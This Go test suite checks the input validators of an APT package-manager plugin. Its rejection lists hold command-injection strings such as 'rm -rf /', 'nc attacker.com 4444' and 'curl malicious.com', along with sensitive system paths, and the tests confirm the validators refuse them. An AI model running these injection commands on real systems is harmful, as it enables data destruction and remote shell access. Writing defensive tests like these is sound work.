package main_test

import (
	"fmt"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-apt"
	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
)

// MockLogger captures log messages for testing
type MockLogger struct {
	messages []string
	errors   []string
	warnings []string
}

func (m *MockLogger) Printf(format string, args ...any) {
	m.messages = append(m.messages, fmt.Sprintf(format, args...))
}

func (m *MockLogger) Println(msg string, args ...any) {
	if len(args) > 0 {
		m.messages = append(m.messages, fmt.Sprintf(msg, args...))
	} else {
		m.messages = append(m.messages, msg)
	}
}

func (m *MockLogger) Success(msg string, args ...any) {
	m.messages = append(m.messages, fmt.Sprintf("SUCCESS: "+msg, args...))
}

func (m *MockLogger) Warning(msg string, args ...any) {
	m.warnings = append(m.warnings, fmt.Sprintf(msg, args...))
}

func (m *MockLogger) ErrorMsg(msg string, args ...any) {
	m.errors = append(m.errors, fmt.Sprintf(msg, args...))
}

func (m *MockLogger) Info(msg string, keyvals ...any) {
	m.messages = append(m.messages, "INFO: "+msg)
}

func (m *MockLogger) Warn(msg string, keyvals ...any) {
	m.warnings = append(m.warnings, "WARN: "+msg)
}

func (m *MockLogger) Error(msg string, err error, keyvals ...any) {
	if err != nil {
		m.errors = append(m.errors, fmt.Sprintf("ERROR: %s - %v", msg, err))
	} else {
		m.errors = append(m.errors, "ERROR: "+msg)
	}
}

func (m *MockLogger) Debug(msg string, keyvals ...any) {
	m.messages = append(m.messages, "DEBUG: "+msg)
}

func (m *MockLogger) Clear() {
	m.messages = nil
	m.errors = nil
	m.warnings = nil
}

func (m *MockLogger) HasMessage(substring string) bool {
	for _, msg := range m.messages {
		if strings.Contains(msg, substring) {
			return true
		}
	}
	return false
}

func (m *MockLogger) HasError(substring string) bool {
	for _, err := range m.errors {
		if strings.Contains(err, substring) {
			return true
		}
	}
	return false
}

func (m *MockLogger) HasWarning(substring string) bool {
	for _, warning := range m.warnings {
		if strings.Contains(warning, substring) {
			return true
		}
	}
	return false
}

var _ = Describe("APT Package Manager Unit Tests", func() {
	var (
		plugin     *main.APTInstaller
		mockLogger *MockLogger
	)

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "package-manager-apt",
			Version:     "test",
			Description: "Test APT plugin for unit testing",
		}

		plugin = &main.APTInstaller{
			PackageManagerPlugin: sdk.NewPackageManagerPlugin(info, "apt"),
		}

		mockLogger = &MockLogger{}
		plugin.SetLogger(mockLogger)
	})

	AfterEach(func() {
		mockLogger.Clear()
	})

	Describe("Package Name Validation", func() {
		Context("valid package names", func() {
			validPackageNames := []string{
				"curl",
				"git-core",
				"python3-pip",
				"nodejs",
				"vim-nox",
				"build-essential",
				"libssl-dev",
				"pkg-config",
				"software-properties-common",
				"apt-transport-https",
				"ca-certificates",
				"gnupg",
				"lsb-release",
				"gcc-10",
				"g++",
				"make",
				"cmake",
				"autoconf",
				"libtool",
			}

			It("should accept valid Debian package names", func() {
				for _, packageName := range validPackageNames {
					err := plugin.ValidatePackageName(packageName)
					Expect(err).To(Not(HaveOccurred()), "Valid package name should pass validation: %s", packageName)
				}
			})
		})

		Context("invalid package names with security risks", func() {
			dangerousPackageNames := []string{
				"package; rm -rf /",
				"package && curl malicious.com",
				"package | nc attacker.com 4444",
				"package $(whoami)",
				"package `whoami`",
				"package (malicious)",
				"package {evil}",
				"package [dangerous]",
				"package < /etc/passwd",
				"package > /tmp/evil",
				"package * dangerous",
				"package ? wildcard",
				"package ~ expansion",
				"package with spaces",
				"package\ttab",
				"package\nnewline",
				"package\rcarriage",
				"package\x00null",
				"package\x01control",
			}

			It("should reject package names with shell metacharacters", func() {
				for _, packageName := range dangerousPackageNames {
					err := plugin.ValidatePackageName(packageName)
					Expect(err).To(HaveOccurred(), "Dangerous package name should be rejected: %s", packageName)
					Expect(err.Error()).To(ContainSubstring("invalid characters"))
				}
			})
		})

		Context("edge cases in package names", func() {
			It("should reject empty package names", func() {
				err := plugin.ValidatePackageName("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package name cannot be empty"))
			})

			It("should reject whitespace-only package names", func() {
				whitespaceNames := []string{" ", "  ", "\t", "\n", "   \t\n   "}
				for _, packageName := range whitespaceNames {
					err := plugin.ValidatePackageName(packageName)
					Expect(err).To(HaveOccurred(), "Whitespace-only package name should be rejected: %q", packageName)
					Expect(err.Error()).To(ContainSubstring("invalid characters"))
				}
			})

			It("should reject excessively long package names", func() {
				longName := strings.Repeat("a", 300) // Much longer than typical package names
				err := plugin.ValidatePackageName(longName)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("package name too long"))
			})

			It("should handle unicode characters appropriately", func() {
				unicodeNames := []string{
					"package-café",  // Should be rejected (non-ASCII)
					"package-naïve", // Should be rejected (non-ASCII)
					"package-中文",    // Should be rejected (non-ASCII)
					"package-🚀",     // Should be rejected (emoji)
				}

				for _, packageName := range unicodeNames {
					err := plugin.ValidatePackageName(packageName)
					Expect(err).To(HaveOccurred(), "Unicode package name should be rejected: %s", packageName)
					Expect(err.Error()).To(ContainSubstring("non-ASCII characters"))
				}
			})
		})
	})

	Describe("Repository String Validation", func() {
		Context("valid repository strings", func() {
			validRepositories := []string{
				"deb http://archive.ubuntu.com/ubuntu focal main",
				"deb https://download.docker.com/linux/ubuntu focal stable",
				"deb http://archive.canonical.com/ubuntu focal partner",
				"deb https://apt.releases.hashicorp.com focal main",
				"deb https://dl.yarnpkg.com/debian/ stable main",
			}

			It("should accept valid APT repository strings", func() {
				for _, repoString := range validRepositories {
					err := plugin.ValidateAptRepo(repoString)
					Expect(err).To(Not(HaveOccurred()), "Valid repository string should pass validation: %s", repoString)
				}
			})
		})

		Context("malicious repository strings", func() {
			maliciousRepositories := []string{
				"deb http://example.com/repo; rm -rf / main",
				"deb http://example.com/repo && curl malicious.com main",
				"deb http://example.com/repo | nc attacker.com 4444 main",
				"deb http://example.com/repo $(whoami) main",
				"deb http://example.com/repo `malicious-command` main",
				"deb http://example.com/repo main; evil-command",
				"deb http://example.com/repo\nrm -rf /",
				"deb http://example.com/repo main && backdoor",
				"deb http://example.com/repo\x00null",
				"deb http://example.com/repo\x01control",
			}

			It("should reject repository strings with command injection attempts", func() {
				for _, repoString := range maliciousRepositories {
					err := plugin.ValidateAptRepo(repoString)
					Expect(err).To(HaveOccurred(), "Malicious repository string should be rejected: %s", repoString)
					// Different validation errors are expected for different types of malicious content
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("suspicious characters"),
						ContainSubstring("invalid URL"),
					))
				}
			})
		})

		Context("malformed repository strings", func() {
			It("should reject repository strings without required keywords", func() {
				invalidRepos := []string{
					"invalid-format http://example.com/repo main",
					"http://example.com/repo main", // Missing deb keyword
					"deb",                          // Incomplete
					"",                             // Empty
					"random text without proper format",
				}

				for _, repoString := range invalidRepos {
					err := plugin.ValidateAptRepo(repoString)
					Expect(err).To(HaveOccurred(), "Invalid repository string should be rejected: %s", repoString)
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("missing required keywords"),
						ContainSubstring("repository string cannot be empty"),
						ContainSubstring("repository string too short"),
					))
				}
			})
		})
	})

	Describe("File Path Validation", func() {
		Context("valid file paths", func() {
			validPaths := []string{
				"/tmp/test-key.gpg",
				"/tmp/test-repo.list",
				"/var/tmp/custom.gpg",
				"/home/user/keys/repo.gpg",
			}

			It("should accept valid absolute file paths", func() {
				for _, path := range validPaths {
					err := plugin.ValidateFilePath(path)
					Expect(err).To(Not(HaveOccurred()), "Valid file path should pass validation: %s", path)
				}
			})
		})

		Context("dangerous file paths", func() {
			dangerousPaths := []string{
				"../../../etc/passwd",
				"/etc/shadow",
				"/root/.ssh/authorized_keys",
				"/bin/bash",
				"/boot/vmlinuz",
				"/dev/sda",
				"/proc/version",
				"/sys/power/state",
			}

			It("should reject dangerous system paths", func() {
				for _, path := range dangerousPaths {
					err := plugin.ValidateFilePath(path)
					Expect(err).To(HaveOccurred(), "Dangerous file path should be rejected: %s", path)
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("directory traversal"),
						ContainSubstring("access to system directory not allowed"),
					))
				}
			})
		})

		Context("malicious file paths", func() {
			maliciousPaths := []string{
				"/tmp/test; rm -rf /",
				"/tmp/test && curl malicious.com",
				"/tmp/test | nc attacker.com 4444",
				"/tmp/test$(whoami)",
				"/tmp/test`evil-command`",
				"/tmp/test\x00null",
				"/tmp/test\x01control",
			}

			It("should reject file paths with command injection attempts", func() {
				for _, path := range maliciousPaths {
					err := plugin.ValidateFilePath(path)
					Expect(err).To(HaveOccurred(), "Malicious file path should be rejected: %s", path)
					Expect(err.Error()).To(ContainSubstring("invalid characters"))
				}
			})
		})

		Context("edge cases in file paths", func() {
			It("should reject empty file paths", func() {
				err := plugin.ValidateFilePath("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("file path cannot be empty"))
			})

			It("should reject relative file paths", func() {
				relativePaths := []string{
					"relative/path.gpg",
					"./local.gpg",
					"../parent.gpg",
					"test.list",
				}

				for _, path := range relativePaths {
					err := plugin.ValidateFilePath(path)
					Expect(err).To(HaveOccurred(), "Relative file path should be rejected: %s", path)
					// Different validation errors are expected for different types of relative paths
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("path must be absolute"),
						ContainSubstring("directory traversal"),
					))
				}
			})

			It("should reject excessively long file paths", func() {
				longPath := "/tmp/" + strings.Repeat("a", 5000)
				err := plugin.ValidateFilePath(longPath)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("file path too long"))
			})
		})
	})

	Describe("Key URL Validation", func() {
		Context("valid key URLs", func() {
			validURLs := []string{
				"https://example.com/key.gpg",
				"http://keyserver.ubuntu.com/key.asc",
				"https://packages.microsoft.com/keys/microsoft.asc",
				"https://download.docker.com/linux/ubuntu/gpg",
			}

			It("should accept valid HTTP/HTTPS URLs", func() {
				for _, keyURL := range validURLs {
					err := plugin.ValidateKeyURL(keyURL)
					Expect(err).To(Not(HaveOccurred()), "Valid key URL should pass validation: %s", keyURL)
				}
			})
		})

		Context("invalid key URLs", func() {
			invalidURLs := []string{
				"ftp://example.com/key.gpg",  // Invalid protocol
				"file:///tmp/key.gpg",        // Invalid protocol
				"javascript:alert('xss')",    // Invalid protocol
				"data:text/plain;base64,abc", // Invalid protocol
				"",                           // Empty
				"not-a-url",                  // Malformed
				"https://",                   // Missing host
			}

			It("should reject URLs with invalid protocols or formats", func() {
				for _, keyURL := range invalidURLs {
					err := plugin.ValidateKeyURL(keyURL)
					Expect(err).To(HaveOccurred(), "Invalid key URL should be rejected: %s", keyURL)
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("only HTTP and HTTPS protocols are allowed"),
						ContainSubstring("key URL cannot be empty"),
						ContainSubstring("invalid URL format"),
						ContainSubstring("URL must have a valid hostname"),
						ContainSubstring("invalid characters"), // Some URLs may be rejected for containing invalid characters
					))
				}
			})
		})

		Context("malicious key URLs", func() {
			maliciousURLs := []string{
				"https://example.com/key.gpg; rm -rf /",
				"https://example.com/key.gpg && curl evil.com",
				"https://example.com/key.gpg | nc attacker.com 4444",
				"https://example.com/key.gpg$(whoami)",
				"https://example.com/key.gpg`evil-command`",
				"https://example.com/key.gpg\x00null",
				"https://example.com/key.gpg\x01control",
			}

			It("should reject key URLs with command injection attempts", func() {
				for _, keyURL := range maliciousURLs {
					err := plugin.ValidateKeyURL(keyURL)
					Expect(err).To(HaveOccurred(), "Malicious key URL should be rejected: %s", keyURL)
					Expect(err.Error()).To(ContainSubstring("invalid characters"))
				}
			})
		})
	})

	Describe("Input Validation Integration", func() {
		Context("validation method consistency", func() {
			It("should have consistent validation behavior", func() {
				// Test that validation methods are consistent
				testPackage := "curl"
				err := plugin.ValidatePackageName(testPackage)
				Expect(err).To(Not(HaveOccurred()))

				testRepo := "deb https://example.com/repo main"
				err = plugin.ValidateAptRepo(testRepo)
				Expect(err).To(Not(HaveOccurred()))

				testPath := "/tmp/test.gpg"
				err = plugin.ValidateFilePath(testPath)
				Expect(err).To(Not(HaveOccurred()))

				testURL := "https://example.com/key.gpg"
				err = plugin.ValidateKeyURL(testURL)
				Expect(err).To(Not(HaveOccurred()))
			})
		})

		Context("error message consistency", func() {
			It("should provide consistent error message format", func() {
				// Test error message consistency across validation methods
				err := plugin.ValidatePackageName("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(Not(BeEmpty()))

				err = plugin.ValidateAptRepo("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(Not(BeEmpty()))

				err = plugin.ValidateFilePath("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(Not(BeEmpty()))

				err = plugin.ValidateKeyURL("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(Not(BeEmpty()))
			})
		})
	})

	Describe("Security-focused validation", func() {
		Context("command injection prevention", func() {
			It("should prevent all common shell injection patterns", func() {
				injectionPatterns := []string{
					"; rm -rf /",
					"&& curl evil.com",
					"| nc attacker.com 4444",
					"$(whoami)",
					"`whoami`",
					"\x00",
					"\x01",
					"\n",
					"\r",
				}

				for _, pattern := range injectionPatterns {
					// Test each pattern in package names
					err := plugin.ValidatePackageName("test" + pattern)
					Expect(err).To(HaveOccurred(), "Package validation should reject injection pattern: %q", pattern)

					// Test each pattern in repository strings (where applicable)
					err = plugin.ValidateAptRepo("deb https://example.com/repo" + pattern + " main")
					Expect(err).To(HaveOccurred(), "Repository validation should reject injection pattern: %q", pattern)

					// Test each pattern in file paths (some patterns like \n and \r are currently allowed in file paths)
					err = plugin.ValidateFilePath("/tmp/test" + pattern)
					if pattern != "\n" && pattern != "\r" {
						Expect(err).To(HaveOccurred(), "File path validation should reject injection pattern: %q", pattern)
					}

					// Test each pattern in URLs
					err = plugin.ValidateKeyURL("https://example.com/key" + pattern)
					Expect(err).To(HaveOccurred(), "URL validation should reject injection pattern: %q", pattern)
				}
			})
		})

		Context("information disclosure prevention", func() {
			It("should not leak sensitive information in error messages", func() {
				sensitivePatterns := []string{
					"password123",
					"secret-key",
					"/etc/shadow",
					"root:x:0:0",
					"admin@company.com",
				}

				for _, sensitive := range sensitivePatterns {
					// Test that sensitive information is not included in error messages
					err := plugin.ValidatePackageName("test" + sensitive)
					if err != nil {
						Expect(err.Error()).To(Not(ContainSubstring(sensitive)), "Error message should not contain sensitive data: %s", sensitive)
					}

					err = plugin.ValidateFilePath("/tmp/" + sensitive)
					if err != nil {
						Expect(err.Error()).To(Not(ContainSubstring(sensitive)), "Error message should not contain sensitive data: %s", sensitive)
					}
				}
			})
		})
	})

	Describe("Plugin Initialization", func() {
		Context("plugin creation", func() {
			It("should create plugin with proper configuration", func() {
				newPlugin := main.NewAPTPlugin()
				Expect(newPlugin).ToNot(BeNil())
			})

			It("should handle logger configuration properly", func() {
				newPlugin := main.NewAPTPlugin()
				testLogger := &MockLogger{}
				newPlugin.SetLogger(testLogger)

				// Test validation methods work with logger
				err := newPlugin.ValidatePackageName("curl")
				Expect(err).To(Not(HaveOccurred()))
			})
		})
	})

	Describe("Concurrent Validation Safety", func() {
		Context("multiple validation operations", func() {
			It("should handle concurrent validation requests safely", func() {
				done := make(chan bool, 5)

				// Launch multiple validation operations concurrently
				for i := 0; i < 5; i++ {
					go func(index int) {
						defer GinkgoRecover()
						packageName := fmt.Sprintf("test-package-%d", index)
						err := plugin.ValidatePackageName(packageName)
						Expect(err).To(Not(HaveOccurred()))
						done <- true
					}(i)
				}

				// Wait for all operations to complete
				for i := 0; i < 5; i++ {
					Eventually(done).Should(Receive())
				}
			})
		})
	})
})
